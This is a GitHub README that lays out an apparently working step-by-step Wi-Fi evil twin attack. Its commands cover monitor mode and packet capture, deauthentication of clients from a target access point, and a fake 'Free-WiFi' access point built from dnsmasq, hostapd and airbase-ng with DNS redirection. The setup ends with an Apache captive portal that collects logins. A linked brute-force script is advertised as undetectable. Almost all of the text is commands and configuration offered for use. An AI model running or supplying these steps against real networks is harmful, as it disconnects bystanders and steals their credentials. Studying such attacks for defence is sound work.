> בס״ד
<div align="center">

<img align="center" width="100" src="https://user-images.githubusercontent.com/51442719/172729066-1293d382-4a31-4f03-8c23-ab0ea5f611a0.png">

⫷ [`HacKingPro`](https://github.com/Anlominus/HacKingPro) ⫸
<br>
⫷ [`TryHackMe`](https://github.com/Anlominus/TryHackMe) | [`KoTH`](https://github.com/Anlominus/TryHackMe/tree/main/King%20of%20the%20Hill/KoTH) ⫸ 
<br>
⫷ [`ScanPro`](https://github.com/Anlominus/ScanPro) | [`Linfo`](https://github.com/Anlominus/Linfo) | [`Diablo`](https://github.com/Anlominus/Diablo) ⫸ 
<br>
⫷ [`Offensive-Security`](https://github.com/Anlominus/Offensive-Security) | [`PenTest`](https://github.com/Anlominus/PenTest) ⫸
<br>
⫷ [`Goals`](https://github.com/Anlominus/Goals) | [`Studies`](https://github.com/Anlominus/Studies) | [`HacKing`](https://github.com/Anlominus/HacKing) | [`AnyTeam`](https://github.com/Anlominus/AnyTeam) ⫸
<br>

</div>

---


  <a href=""><br><img title="Made in ISRAEL" src="https://img.shields.io/badge/MADE%20IN-ISRAEL-blue?style=for-the-badge"></a>

# HacKingWiFi
## HacKingWiFi 
### Algorithm Commands to HacKing WiFi 

# [1] Choosing Wireless Adapter / Get Interface:
  - [1.1] Cheking for Wireless Network interface: `iwconfig`  
  - [1.2] Cheking for Wireless Network interface: `ifconfig`

---

# [2] Start Monitoring Mode & Checking Injection Option 
  - [2.1] Starting Monitor mode: `airmon-ng start $INTERFACE`
  - [2.2] Monitoring: `aireplay-ng --test $INTERFACE`

---
  
# [3] Scan Wireless’s Area
  - [3.1] Sniff Networks Area Information : `airodump-ng $INTERFACE`
  - [3.2] Start Capturing Packets: `airodump-ng --bssid $BSSID -c $CHANNEL_NUMBER -w $OUTPUT_NAME $INTERFACE`
  - [3.3] Inject Packets into Wireless Network: `aireplay-ng --deauth 10 -a $MAC_TARGET $INTERFACE`

---

# [4] Analysis Captured Files With WireShark:
  - [4.1] Start WireShark: `wireshark $OUTPUT_NAME.cap`
    - Looking for Authentication Files

---

# [5] Set Up Access point:
  - [5.1] Create dnsmasq Configuration files: `nano dnsmasq.conf`
```SHELL
#Set the wireless interface
interface=wlan0

#Set the IP range for the clients
dhcp-range=192.168.1.2,192.168.1.250,12h

#Set the gateway IP address
dhcp-option=3,192.168.1.1

#Set DNS server address
dhcp-option=6,192.168.1.1

#Redirect all requests to 192.168.1.1
address=/#/192.168.1.1
```
  - [5.2] Create hostpad Configuration file: `nano hostapd.conf` 
```SHELL
#Set wireless interface
interface=wlan0

#Set network name
ssid=Free-WiFi

#Set channel
channel=11

#Set driver
driver=nl80211
```
  - [5.3] Run Commands 1: `dnsmasq -C /directory_to_dnsmasq.conf`
  - [5.4] Run Commands 2: `hostapd /directory_to_hostapd.conf -B`
  - [5.5] Create a Fake Access Point with the Name: `airbase-ng -e $WIRELESS_NETWORK -c $CHANNEL $INTERFACE` 

---

# [6] Setting up Captive Portal
  - [6.1] Download and Move Portal files to `/var/www/html`
  - [6.2] Edit `nano /etc/apache2/sites-enabled/000-default.conf` & Add to end of it:
```shell

<Directory "/var/www/html">
RewriteEngine On
RewriteBase /
RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
RewriteRule ^(.*)$ http://%1/$1 [R=301,L]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ / [L,QSA]
</Directory>

```
  - [6.3] Start Apache2 Server: `sudo service apache2 start`
  - [6.4] Connect to `Free-WiFi`, and that will been automatically redirected to the logging page.
 
 ---
 
 # Sources
 
 - Learning: [WiFi Hacking using Evil Twin Attacks and Captive Portals](https://github.com/Anlominus/Studies/tree/main/Udemy/IT%20%26%20Software/Network%20%26%20Security/Security%20HacKing/WiFi%20Hacking%20using%20Evil%20Twin%20Attacks%20and%20Captive%20Portals)
- Tool: [EvilAP_Defender](https://github.com/moha99sa/EvilAP_Defender)
- [WiFi Penetration Testing Guide](https://github.com/ricardojoserf/wifi-pentesting-guide)
- [WifiBF](https://github.com/Squuv/WifiBF) ~ This is a wifi Brute Force. script undetectable and secure!
- 


---

![Alt](https://repobeats.axiom.co/api/embed/7744ec1728e3e44cc7921678a5d5a314e096fe97.svg "Repobeats analytics image")

